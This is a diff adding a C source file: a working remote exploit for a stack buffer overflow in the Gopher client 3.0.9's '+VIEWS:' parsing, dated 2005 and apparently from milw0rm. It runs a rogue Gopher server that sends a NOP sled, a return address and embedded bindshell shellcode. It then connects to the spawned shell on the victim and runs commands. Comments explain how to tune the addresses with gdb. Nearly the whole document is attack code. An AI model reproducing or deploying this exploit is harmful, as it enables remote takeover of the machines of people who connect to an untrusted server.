@@ -1,0 +1,253 @@
+/*[ gopher[v3.0.9+]: remote (client) buffer overflow exploit. ]
+* 
+* by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)
+* 
+* compile: 
+* gcc xgopher-client.c -o xgopher-client 
+* 
+* syntax: 
+* ./xgopher-client <port> [bindshell port] 
+* 
+* The Internet Gopher Client is based on the UMN 
+* Gopher/Gopherd 2.3.1 code. Gopher is an Internet technology 
+* that predates the Web. It presents information as a virtual 
+* network-wide filesystem. Modern browsers such as Konqueror 
+* can display gopherspace as if it contained files on your 
+* local machine (trees, drag and drop, etc.), but the 
+* difference is that each file or folder in that tree may be 
+* on a different machine. 
+* 
+* this client contains a remotely exploitable buffer overflow 
+* in the processing of "+VIEWS:" information, located in 
+* SRC/object/VIews.c in the VIfromLine() function. 
+* 
+* this is a stack overflow that can be exploited immediately 
+* upon the client's connection to an untrusted gopher server. 
+* while this is a stack overflow, exploitation of this 
+* overflow is not completely standard, and special values 
+* will be needed for it to work. (see the first three DEFINEs 
+* below) 
+* 
+* i made this simply to be sure it was possible to exploit, 
+* tested successfully on mandrake/9.2 with gopher/3.0.9 
+* compiled from source. 
+***************************************************************/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <strings.h>
+#include <signal.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+/* THE FOLLOWING THREE DEFINES WILL BE UNIQUE TO EACH SYSTEM. */
+
+/* this needs to be replaced as a null-byte will overwrite it. this */
+/* can be found in gdb using a trial-run of the exploit. */
+/* (gdb) break VIfromLine */
+/* Breakpoint 1 at 0x805c2e5: file VIews.c, line 231. */
+/* (gdb) run server-running-this-exploit.com 70 */
+/* ... */
+/* Breakpoint 1, VIfromLine (vi=0x8074f08, ... */
+/* -----------------------------^^^^^^^^^ */
+/* ... */
+#define REPLACE_VI_ADDR 0x08074f08
+
+/* where the shellcode is located. you can use a trial-run to get */
+/* this as well, run "objdump -s <core> | grep 90909090" on the */
+/* core file, and choose something in the middle of all the */
+/* 0xbfff???? addresses dumped. */
+#define RET_ADDR 0xbfffe910
+
+/* guess time; try between 0-12, not likely to be anything */
+/* higher than that. */
+#define PLACEMENT_OFFSET 7
+
+/* FROM HERE ON THE DEFINES DO NOT NEED TO BE MODIFIED. */
+#define BUFSIZE 500
+#define DFL_BINDSHELL_PORT 7979
+#define TIMEOUT 10
+
+static char x86_exec[]= /* bindshell, from netric. */
+"\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66"
+"\xcd\x80\x31\xd2\x52\x66\x68\xff\xff\x43\x66\x53\x89"
+"\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89"
+"\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52"
+"\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80"
+"\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68"
+"\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd"
+"\x80";
+
+/* prototypes. */
+unsigned char *getcode(void);
+char *gopherd_bind(unsigned short);
+void getshell(char *,unsigned short);
+void printe(char *,short);
+void sig_alarm(){printe("alarm/timeout hit.",1);}
+
+/* begin. */
+int main(int argc,char **argv){
+unsigned short port=0,sport=DFL_BINDSHELL_PORT;
+char *hostptr;
+printf("[*] gopher[v3.0.9+]: remote (client) buffer overflow exp"
+"loit.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
+if(argc<2){
+printf("[!] syntax: %s <port> [bindshell port]\n",argv[0]);
+exit(1);
+}
+port=atoi(argv[1]);
+if(argc>2)sport=atoi(argv[2]);
+
+/* set the port to bind to in the shellcode. */
+x86_exec[20]=(sport&0xff00)>>8;
+x86_exec[21]=(sport&0x00ff);
+
+/* verbose values display. */
+printf("[*] replacement \"vi\" address\t\t: 0x%.8x\n",REPLACE_VI_ADDR);
+printf("[*] return address\t\t\t: 0x%.8x\n",RET_ADDR);
+printf("[*] offset from the end of tmpstr[]\t: %d (=%d)\n",
+PLACEMENT_OFFSET,PLACEMENT_OFFSET*4);
+printf("[*] server port\t\t\t\t: %u\n",port);
+printf("[*] bindshell port\t\t\t: %u\n\n",sport);
+
+/* wait for a connection and send overflow. */
+hostptr=gopherd_bind(port);
+
+/* be safe, and give it time to run. */
+sleep(3);
+
+/* see if a shell spawned. */
+getshell(hostptr,sport);
+
+exit(0);
+}
+/* this is what fills the buffer that will be overflown. (tmpstr[256]) */
+unsigned char *getcode(void){
+unsigned char *buf;
+if(!(buf=(unsigned char *)malloc(BUFSIZE+1)))
+printe("getcode(): allocating memory failed.",1);
+
+/* make everything nops, and overwrite where needed. */
+memset(buf,0x90,BUFSIZE);
+
+/* this gives more NOP/guessing room. if it hits before the addresses, */
+/* it will jump over them to get to the shellcode. (jumps 8 bytes) */
+buf[254+(PLACEMENT_OFFSET*4)]=0xeb; /* jump, */
+buf[255+(PLACEMENT_OFFSET*4)]=0x08; /* 8. */
+
+/* return address. */
+*(long *)&buf[256+(PLACEMENT_OFFSET*4)]=RET_ADDR;
+
+/* the replacement value will be right after the new return address. */
+/* (this is needed because a null-byte will corrupt it, and fault */
+/* where not desired) */
+*(long *)&buf[260+(PLACEMENT_OFFSET*4)]=REPLACE_VI_ADDR;
+
+/* add shellcode to the end of the buffer. */
+memcpy(buf+BUFSIZE-strlen(x86_exec),x86_exec,strlen(x86_exec));
+return(buf);
+}
+char *gopherd_bind(unsigned short port){
+int ssock=0,sock=0,so=1;
+unsigned int salen=0;
+char pseudobuf[2];
+struct sockaddr_in ssa,sa;
+ssock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+setsockopt(ssock,SOL_SOCKET,SO_REUSEADDR,(void *)&so,sizeof(so));
+#ifdef SO_REUSEPORT
+setsockopt(ssock,SOL_SOCKET,SO_REUSEPORT,(void *)&so,sizeof(so));
+#endif
+ssa.sin_family=AF_INET;
+ssa.sin_port=htons(port);
+ssa.sin_addr.s_addr=INADDR_ANY;
+printf("[*] awaiting connection from: *:%d.\n",port);
+if(bind(ssock,(struct sockaddr *)&ssa,sizeof(ssa))==-1)
+printe("could not bind socket.",1);
+listen(ssock,1); 
+bzero((char*)&sa,sizeof(struct sockaddr_in));
+salen=sizeof(sa);
+sock=accept(ssock,(struct sockaddr *)&sa,&salen);
+close(ssock);
+printf("[*] gopher server connection established.\n");
+
+/* not really needed, but i feel better with it waiting for it. */
+printf("[*] waiting for <any> request/data...\n");
+read(sock,pseudobuf,1);
+printf("[*] received request/data, sending overflow.\n");
+
+/* setup the precursor to cause the overflow. */
+write(sock,"+-1\n",4);
+write(sock,"+INFO:\t0filler\tfiller\tfiller\tfiller\n",36);
+write(sock,"+VIEWS:\t\n ",10);
+
+/* the overflow. */
+write(sock,getcode(),BUFSIZE);
+write(sock,"\n",1);
+
+sleep(1);
+close(sock);
+printf("[*] gopher server connection closed.\n");
+return(inet_ntoa(sa.sin_addr));
+}
+void getshell(char *hostname,unsigned short port){
+int sock,r;
+fd_set fds;
+char buf[4096+1];
+struct hostent *he;
+struct sockaddr_in sa;
+printf("[*] checking to see if the exploit was successful.\n");
+if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
+printe("getshell(): socket() failed.",1);
+sa.sin_family=AF_INET;
+if((sa.sin_addr.s_addr=inet_addr(hostname))){
+if(!(he=gethostbyname(hostname)))
+printe("getshell(): couldn't resolve.",1);
+memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
+sizeof(sa.sin_addr));
+}
+sa.sin_port=htons(port);
+signal(SIGALRM,sig_alarm);
+alarm(TIMEOUT);
+printf("[*] attempting to connect: %s:%d.\n",hostname,port);
+if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
+printf("[!] connection failed: %s:%d.\n",hostname,port);
+return;
+}
+alarm(0);
+printf("[*] successfully connected: %s:%d.\n\n",hostname,port);
+signal(SIGINT,SIG_IGN);
+write(sock,"uname -a;id\n",13);
+while(1){
+FD_ZERO(&fds);
+FD_SET(0,&fds);
+FD_SET(sock,&fds);
+if(select(sock+1,&fds,0,0,0)<1)
+printe("getshell(): select() failed.",1);
+if(FD_ISSET(0,&fds)){
+if((r=read(0,buf,4096))<1)
+printe("getshell(): read() failed.",1);
+if(write(sock,buf,r)!=r)
+printe("getshell(): write() failed.",1);
+}
+if(FD_ISSET(sock,&fds)){
+if((r=read(sock,buf,4096))<1)
+exit(0);
+write(1,buf,r);
+}
+}
+close(sock);
+return;
+}
+void printe(char *err,short e){
+printf("[!] %s\n",err);
+if(e)
+exit(1);
+return;
+}
+
+// milw0rm.com [2005-08-30]
